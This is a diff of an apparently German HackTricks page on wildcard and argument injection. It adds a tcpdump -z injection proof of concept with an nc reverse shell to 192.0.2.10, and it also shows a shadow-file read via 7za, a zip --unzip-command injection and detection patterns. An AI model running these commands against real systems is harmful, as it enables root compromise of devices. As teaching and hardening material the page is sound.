@@ -76,7 +76,7 @@ Wenn root etwas wie Folgendes ausführt:
 ```bash
 7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-7-Zip wird versuchen, `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen und wird abbrechen, **indem es den Inhalt auf stderr ausgibt**.
+7-Zip wird versuchen, `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen und wird abbrechen, **während es den Inhalt auf stderr ausgibt**.
 
 ---
 
@@ -86,11 +86,11 @@ Wenn root etwas wie Folgendes ausführt:
 ```bash
 zip result.zip files -T --unzip-command "sh -c id"
 ```
-Injectiere das Flag über einen gestalteten Dateinamen und warte darauf, dass das privilegierte Backup-Skript `zip -T` (Archiv testen) auf der resultierenden Datei aufruft.
+Injiziere das Flag über einen gestalteten Dateinamen und warte darauf, dass das privilegierte Backup-Skript `zip -T` (Archiv testen) auf der resultierenden Datei aufruft.
 
 ---
 
-## Zusätzliche Binärdateien, die anfällig für Wildcard-Injection sind (schnelle Liste 2023-2025)
+## Zusätzliche Binärdateien, die anfällig für Wildcard-Injection sind (2023-2025 Schnellübersicht)
 
 Die folgenden Befehle wurden in modernen CTFs und realen Umgebungen missbraucht. Die Payload wird immer als *Dateiname* in einem beschreibbaren Verzeichnis erstellt, das später mit einem Wildcard verarbeitet wird:
 
@@ -105,19 +105,65 @@ Diese Primitiven sind weniger verbreitet als die *tar/rsync/zip* Klassiker, aber
 
 ---
 
-## Erkennung & Härtung
+## tcpdump-Rotationshaken (-G/-W/-z): RCE über argv-Injection in Wrappers
 
-1. **Deaktiviere Shell-Gloßing** in kritischen Skripten: `set -f` (`set -o noglob`) verhindert die Wildcard-Erweiterung.
-2. **Zitiere oder entkomme** Argumenten: `tar -czf "$dst" -- *` ist *nicht* sicher — bevorzuge `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
-3. **Explizite Pfade**: Verwende `/var/www/html/*.log` anstelle von `*`, damit Angreifer keine Geschwisterdateien erstellen können, die mit `-` beginnen.
-4. **Minimalprivilegien**: Führe Backup-/Wartungsjobs nach Möglichkeit als unprivilegiertes Dienstkonto anstelle von root aus.
+Wenn eine eingeschränkte Shell oder ein Anbieter-Wrap einen `tcpdump`-Befehl erstellt, indem sie benutzerkontrollierte Felder (z. B. ein "Dateiname"-Parameter) ohne strikte Anführungszeichen/Validierung verknüpft, kannst du zusätzliche `tcpdump`-Flags schmuggeln. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Anzahl der Dateien begrenzen) und `-z <cmd>` (Post-Rotate-Befehl) führt zu beliebiger Befehlsausführung als der Benutzer, der tcpdump ausführt (oft root auf Geräten).
+
+Voraussetzungen:
+
+- Du kannst `argv` beeinflussen, das an `tcpdump` übergeben wird (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).
+- Der Wrapper bereinigt keine Leerzeichen oder mit `-` beginnende Tokens im Dateinamenfeld.
+
+Klassisches PoC (führt ein Reverse-Shell-Skript von einem beschreibbaren Pfad aus):
+```sh
+# Reverse shell payload saved on the device (e.g., USB, tmpfs)
+cat > /mnt/disk1_1/rce.sh <<'EOF'
+#!/bin/sh
+rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
+EOF
+chmod +x /mnt/disk1_1/rce.sh
+
+# Inject additional tcpdump flags via the unsafe "file name" field
+/debug/tcpdump --filter="udp port 1234" \
+--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"
+
+# On the attacker host
+nc -6 -lvnp 4444 &
+# Then send any packet that matches the BPF to force a rotation
+printf x | nc -u -6 [victim_ipv6] 1234
+```
+Details:
+
+- `-G 1 -W 1` zwingt eine sofortige Rotation nach dem ersten übereinstimmenden Paket.
+- `-z <cmd>` führt den Post-Rotate-Befehl einmal pro Rotation aus. Viele Builds führen `<cmd> <savefile>` aus. Wenn `<cmd>` ein Skript/Interpreter ist, stellen Sie sicher, dass die Argumentbehandlung mit Ihrem Payload übereinstimmt.
+
+No-removable-media Varianten:
+
+- Wenn Sie eine andere Primitive zum Schreiben von Dateien haben (z. B. einen separaten Befehlswrapper, der die Umleitung von Ausgaben ermöglicht), legen Sie Ihr Skript in einen bekannten Pfad und triggern Sie `-z /bin/sh /path/script.sh` oder `-z /path/script.sh`, je nach Plattformsemantik.
+- Einige Vendor-Wrappers rotieren zu vom Angreifer kontrollierbaren Standorten. Wenn Sie den rotierten Pfad beeinflussen können (symlink/verzeichnis traversal), können Sie `-z` steuern, um Inhalte auszuführen, die Sie vollständig kontrollieren, ohne externe Medien.
+
+Hardening-Tipps für Anbieter:
+
+- Geben Sie niemals benutzerkontrollierte Zeichenfolgen direkt an `tcpdump` (oder ein beliebiges Tool) ohne strenge Allowlists weiter. Zitieren und validieren.
+- Setzen Sie die `-z`-Funktionalität in Wrappers nicht aus; führen Sie tcpdump mit einer festen sicheren Vorlage aus und verbieten Sie zusätzliche Flags vollständig.
+- Reduzieren Sie die tcpdump-Berechtigungen (cap_net_admin/cap_net_raw nur) oder führen Sie es unter einem dedizierten unprivilegierten Benutzer mit AppArmor/SELinux-Einschränkung aus.
+
+
+## Detection & Hardening
+
+1. **Deaktivieren Sie die Shell-Gloßierung** in kritischen Skripten: `set -f` (`set -o noglob`) verhindert die Wildcard-Erweiterung.
+2. **Zitieren oder Escapen** Sie Argumente: `tar -czf "$dst" -- *` ist *nicht* sicher — bevorzugen Sie `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
+3. **Explizite Pfade**: Verwenden Sie `/var/www/html/*.log` anstelle von `*`, damit Angreifer keine Geschwisterdateien erstellen können, die mit `-` beginnen.
+4. **Minimalprivileg**: Führen Sie Backup-/Wartungsjobs nach Möglichkeit als unprivilegiertes Dienstkonto anstelle von root aus.
 5. **Überwachung**: Die vorgefertigte Regel von Elastic *Potential Shell via Wildcard Injection* sucht nach `tar --checkpoint=*`, `rsync -e*` oder `zip --unzip-command`, die sofort von einem Shell-Kindprozess gefolgt werden. Die EQL-Abfrage kann für andere EDRs angepasst werden.
 
 ---
 
-## Referenzen
+## References
 
-* Elastic Security – Regel *Potential Shell via Wildcard Injection Detected* (letzte Aktualisierung 2025)
+* Elastic Security – Regel *Potential Shell via Wildcard Injection Detected* (zuletzt aktualisiert 2025)
 * Rutger Flohil – “macOS — Tar wildcard injection” (18. Dez 2024)
+* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
